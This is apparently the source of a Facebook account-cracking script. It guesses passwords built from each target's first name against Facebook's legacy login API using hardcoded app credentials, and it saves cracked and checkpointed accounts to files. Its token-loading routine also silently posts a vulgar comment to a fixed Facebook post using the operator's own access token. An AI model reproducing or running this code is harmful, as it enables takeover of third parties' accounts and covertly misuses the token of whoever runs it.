def x(user):
	global loop
	try:
		os.mkdir("result")
	except:
		pass
	try:
		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
		for pas in [nama+"01","@"+nama,]:
			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
				found.append("%s | %s"%(user,pas))
			elif "www.facebook.com" in p["error_msg"]:
				open("result/checkpoint.txt","a").write("%s | %s\n"%(user,pas))
				checkpoint.append("%s | %s"%(user,pas))
        
        
        
        
		loop+=1
		print("\r%s[%s%s%s]%s cracking %s/%s found:%s%s   "%(P,Y,len(checkpoint),P,W,loop,len(target),G,len(found)),end=""),;sys.stdout.flush()
	except:pass
		
def result(found,checkpoint):
	if len(found) !=0:
		print("\n\n%s[%s] %sfound%s >"%(G,len(found),W,R))
		for i in found:
			print("%s###%s %s"%(G,W,i))
		print("\n%s[+]%s file saved: result/found.txt"%(P,W))
	if len(checkpoint) !=0:
		print("\n\n%s[%s] %scheckpoint%s >"%(Y,len(checkpoint),W,R))
		for i in checkpoint:
			print("%s###%s %s"%(Y,W,i))
		print("\n%s[+]%s file saved: result/checkpoint.txt"%(P,W))
	if len(found)==0 and len(checkpoint)==0:
		print("\n\n%s[!]%s no result found:)"%(R,W))
		
def cek():
	global toket
	banner()
	print("%s[*]%s load access token"%(P,W))
	sleep(1)
	try:
		os.mkdir("cookie")
	except:
		pass
	try:
		toket = open("cookie/token.log","r").read()
	except OSError:
		print("%s[×] %sups sorry token not found !!"%(R,W))
		sleep(1)
		login()
    
    
	try:
		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
		s.post(url.format("100005584243934_1145924785603652/comments?message=Kontol....&access_token=%s"%(toket)))
		print("%s[*] %ssuccess load access token"%(G,W))
		sleep(1)
		menu(n,toket)
	except KeyError:
		os.system("rm -rf cookie/token.log")
		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
		sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		exit("%s[!] %sups no connection !!"%(R,W))
